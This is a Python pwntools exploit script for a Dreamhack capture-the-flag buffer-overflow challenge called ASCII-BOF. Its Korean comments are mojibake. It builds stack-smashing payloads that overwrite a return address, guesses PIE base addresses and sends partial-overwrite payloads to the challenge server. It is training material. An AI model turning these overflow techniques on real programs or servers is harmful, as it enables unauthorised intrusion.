#!/usr/bin/env python3

"""
ASCII-BOF ë‹¨ê³„ë³„ ìµìŠ¤í”Œë¡œì‡ ê°œë°œ
ì™„ì „íˆ ê¸°ì´ˆë¶€í„° ë‹¨ê³„ë³„ë¡œ ì§„í–‰
"""

from pwn import *

def step1_local_flag_function_call():
    """1ë‹¨ê³„: ë¡œì»¬ì—ì„œ í”Œë˜ê·¸ í•¨ìˆ˜ ì§ì ‘ í˜¸ì¶œ"""
    print("[+] 1ë‹¨ê³„: ë¡œì»¬ì—ì„œ í”Œë˜ê·¸ í•¨ìˆ˜ ì§ì ‘ í˜¸ì¶œ")
    print("=" * 50)
    
    binary_path = './main'
    
    # ìŠ¤íƒ êµ¬ì¡°: 16ë°”ì´íŠ¸ ë²„í¼ + 8ë°”ì´íŠ¸ RBP + 8ë°”ì´íŠ¸ ë¦¬í„´ ì£¼ì†Œ
    buffer_size = 16
    rbp_size = 8
    flag_function_offset = 0x1339
    
    # PIEê°€ êº¼ì§„ ìƒíƒœë¼ê³  ê°€ì •í•˜ê³  ì§ì ‘ ì£¼ì†Œ ì‚¬ìš©
    flag_address = flag_function_offset
    
    payload = b"A" * buffer_size          # ë²„í¼ ì±„ìš°ê¸°
    payload += b"B" * rbp_size            # RBP ë®ì–´ì“°ê¸°
    payload += p64(flag_address)          # ë¦¬í„´ ì£¼ì†Œë¥¼ í”Œë˜ê·¸ í•¨ìˆ˜ë¡œ
    
    print(f"í˜ì´ë¡œë“œ ê¸¸ì´: {len(payload)}")
    print(f"í˜ì´ë¡œë“œ: {payload}")
    
    try:
        p = process(binary_path)
        p.sendline(payload)
        output = p.recvall(timeout=3)
        print(f"ê²°ê³¼: {output}")
        
        if b"DH{" in output or b"flag" in output:
            print("ğŸ‰ ë¡œì»¬ì—ì„œ í”Œë˜ê·¸ í•¨ìˆ˜ í˜¸ì¶œ ì„±ê³µ!")
        else:
            print("í”Œë˜ê·¸ í•¨ìˆ˜ í˜¸ì¶œí–ˆì§€ë§Œ í”Œë˜ê·¸ ì—†ìŒ")
            
        p.close()
    except Exception as e:
        print(f"ì˜¤ë¥˜: {e}")

def step2_find_pie_base():
    """2ë‹¨ê³„: PIE ë² ì´ìŠ¤ ì£¼ì†Œ ì°¾ê¸°"""
    print("\n[+] 2ë‹¨ê³„: PIE ë² ì´ìŠ¤ ì£¼ì†Œ ì°¾ê¸°")
    print("=" * 50)
    
    # GDBë¡œ PIE ë² ì´ìŠ¤ ì£¼ì†Œ í™•ì¸
    gdb_script = """
set pagination off
file ./main
b *main
run
p/x $rip - 0x1229
quit
"""
    
    with open('pie_base.gdb', 'w') as f:
        f.write(gdb_script)
    
    print("PIE ë² ì´ìŠ¤ ì£¼ì†Œ í™•ì¸ ì¤‘...")
    
    # ì¼ë°˜ì ì¸ PIE ë² ì´ìŠ¤ ì¶”ì •
    estimated_bases = [
        0x555555554000,
        0x7ffff7dd0000, 
        0x400000,
    ]
    
    for base in estimated_bases:
        flag_addr = base + 0x1339
        print(f"ë² ì´ìŠ¤ 0x{base:x} ì‹œë„ -> í”Œë˜ê·¸ í•¨ìˆ˜: 0x{flag_addr:x}")
        
        if test_flag_address(flag_addr):
            print(f"ğŸ‰ ì„±ê³µ! PIE ë² ì´ìŠ¤: 0x{base:x}")
            return base
    
    print("PIE ë² ì´ìŠ¤ ì°¾ê¸° ì‹¤íŒ¨")
    return None

def test_flag_address(flag_addr):
    """íŠ¹ì • ì£¼ì†Œë¡œ í”Œë˜ê·¸ í•¨ìˆ˜ í˜¸ì¶œ í…ŒìŠ¤íŠ¸"""
    binary_path = './main'
    
    payload = b"A" * 16 + b"B" * 8 + p64(flag_addr)
    
    try:
        p = process(binary_path)
        p.sendline(payload)
        output = p.recvall(timeout=2)
        p.close()
        
        return b"flag" in output.lower() or b"DH{" in output
    except:
        return False

def step3_server_test():
    """3ë‹¨ê³„: ì„œë²„ì—ì„œ í…ŒìŠ¤íŠ¸"""
    print("\n[+] 3ë‹¨ê³„: ì„œë²„ì—ì„œ í…ŒìŠ¤íŠ¸")
    print("=" * 50)
    
    HOST = 'host8.dreamhack.games'
    PORT = 14428
    
    # ê¸°ë³¸ ì„œë²„ ì‘ë‹µ í™•ì¸
    print("ê¸°ë³¸ ì„œë²„ ì‘ë‹µ í™•ì¸:")
    try:
        r = remote(HOST, PORT)
        r.recvline()  # Welcome ë©”ì‹œì§€
        r.send(b"AAAA\n")
        response = r.recvall(timeout=2)
        print(f"ì„œë²„ ì‘ë‹µ: {response}")
        r.close()
    except Exception as e:
        print(f"ì„œë²„ ì—°ê²° ì˜¤ë¥˜: {e}")
        return
    
    # 32ë°”ì´íŠ¸ í¬ë˜ì‹œ í…ŒìŠ¤íŠ¸
    print("\n32ë°”ì´íŠ¸ í¬ë˜ì‹œ í…ŒìŠ¤íŠ¸:")
    try:
        r = remote(HOST, PORT) 
        r.recvline()
        r.send(b"A" * 32 + b"\n")
        response = r.recvall(timeout=2)
        print(f"í¬ë˜ì‹œ í…ŒìŠ¤íŠ¸ ì‘ë‹µ: {response}")
        r.close()
    except Exception as e:
        print(f"í¬ë˜ì‹œ í…ŒìŠ¤íŠ¸ ì˜¤ë¥˜: {e}")

def step4_ascii_compatible_address():
    """4ë‹¨ê³„: ASCII í˜¸í™˜ ì£¼ì†Œ ë§Œë“¤ê¸°"""
    print("\n[+] 4ë‹¨ê³„: ASCII í˜¸í™˜ ì£¼ì†Œ ë§Œë“¤ê¸°")
    print("=" * 50)
    
    # ì¼ë°˜ì ì¸ PIE ë² ì´ìŠ¤ì—ì„œ ASCII í˜¸í™˜ì„± í™•ì¸
    base_addresses = [
        0x555555554000,
        0x7ffff7dd0000,
    ]
    
    for base in base_addresses:
        flag_addr = base + 0x1339
        addr_bytes = p64(flag_addr)
        
        print(f"\në² ì´ìŠ¤: 0x{base:x}")
        print(f"í”Œë˜ê·¸ ì£¼ì†Œ: 0x{flag_addr:x}")
        print(f"ë°”ì´íŠ¸: {addr_bytes.hex()}")
        
        # ASCII í˜¸í™˜ì„± ì²´í¬
        ascii_compatible = []
        for i, byte in enumerate(addr_bytes):
            is_ascii = 0x20 < byte < 0x7f
            ascii_compatible.append(is_ascii)
            char = chr(byte) if is_ascii else '?'
            print(f"  ë°”ì´íŠ¸ {i}: 0x{byte:02x} ({char}) - {'âœ…' if is_ascii else 'âŒ'}")
        
        if all(ascii_compatible[:6]):  # ì²˜ìŒ 6ë°”ì´íŠ¸ë§Œ ì²´í¬
            print("ğŸ‰ ASCII í˜¸í™˜ ì£¼ì†Œ ë°œê²¬!")
            return base, flag_addr
    
    print("ASCII í˜¸í™˜ ì£¼ì†Œ ì—†ìŒ")
    return None, None

def step5_partial_overwrite():
    """5ë‹¨ê³„: ë¶€ë¶„ ì£¼ì†Œ ë®ì–´ì“°ê¸° ì‹œë„"""
    print("\n[+] 5ë‹¨ê³„: ë¶€ë¶„ ì£¼ì†Œ ë®ì–´ì“°ê¸° ì‹œë„")
    print("=" * 50)
    
    HOST = 'host8.dreamhack.games' 
    PORT = 14428
    
    # 1ë°”ì´íŠ¸ ë¶€ë¶„ ë®ì–´ì“°ê¸°ë¡œ í•¨ìˆ˜ ë³€ê²½
    # main+83ì—ì„œ call 0x1297 í˜¸ì¶œ
    # ë¦¬í„´ ì£¼ì†Œë¥¼ 0x1297 ëŒ€ì‹  0x1339ë¡œ ë³€ê²½
    
    # ì˜ˆìƒ ë¦¬í„´ ì£¼ì†Œì˜ í•˜ìœ„ ë°”ì´íŠ¸ë“¤ì„ ASCII ë²”ìœ„ë¡œ ë³€ê²½
    ascii_bytes = []
    for i in range(0x21, 0x7f):  # ASCII ì¶œë ¥ ê°€ëŠ¥ ë²”ìœ„
        ascii_bytes.append(i)
    
    print(f"í…ŒìŠ¤íŠ¸í•  ASCII ë°”ì´íŠ¸: {len(ascii_bytes)}ê°œ")
    
    # ì„œë²„ì—ì„œ ëª‡ ê°œë§Œ í…ŒìŠ¤íŠ¸
    test_bytes = [0x39, 0x41, 0x42, 0x43, 0x53]  # '9', 'A', 'B', 'C', 'S'
    
    for byte_val in test_bytes:
        print(f"\në°”ì´íŠ¸ 0x{byte_val:02x} ('{chr(byte_val)}') í…ŒìŠ¤íŠ¸:")
        
        payload = b"A" * 24 + bytes([byte_val])
        
        if len(payload) > 32:
            print("32ë°”ì´íŠ¸ ì´ˆê³¼ - ê±´ë„ˆëœ€")
            continue
        
        try:
            r = remote(HOST, PORT)
            r.recvline()
            r.send(payload + b'\n')
            response = r.recvall(timeout=2)
            print(f"ì‘ë‹µ: {response}")
            
            if b'DH{' in response:
                print("ğŸ‰ğŸ‰ğŸ‰ í”Œë˜ê·¸ ë°œê²¬!")
                return response
            
            r.close()
            
        except Exception as e:
            print(f"ì˜¤ë¥˜: {e}")
    
    print("ë¶€ë¶„ ë®ì–´ì“°ê¸° ì‹¤íŒ¨")
    return None

if __name__ == "__main__":
    print("ğŸš€ ASCII-BOF ë‹¨ê³„ë³„ ìµìŠ¤í”Œë¡œì‡ ê°œë°œ")
    print("=" * 60)
    
    # 1ë‹¨ê³„: ë¡œì»¬ í…ŒìŠ¤íŠ¸
    step1_local_flag_function_call()
    
    # 2ë‹¨ê³„: PIE ë² ì´ìŠ¤ ì°¾ê¸°
    pie_base = step2_find_pie_base()
    
    # 3ë‹¨ê³„: ì„œë²„ í…ŒìŠ¤íŠ¸
    step3_server_test()
    
    # 4ë‹¨ê³„: ASCII í˜¸í™˜ ì£¼ì†Œ
    base, flag_addr = step4_ascii_compatible_address()
    
    # 5ë‹¨ê³„: ë¶€ë¶„ ë®ì–´ì“°ê¸°
    result = step5_partial_overwrite()
    
    if result:
        print(f"\nğŸ‰ğŸ‰ğŸ‰ ìµœì¢… ì„±ê³µ!")
        print(f"í”Œë˜ê·¸: {result}")
    else:
        print("\nğŸ˜ ëª¨ë“  ë‹¨ê³„ ì™„ë£Œí–ˆì§€ë§Œ ì„±ê³µí•˜ì§€ ëª»í•¨")
        print("ì¶”ê°€ ë¶„ì„ì´ í•„ìš”í•©ë‹ˆë‹¤.")
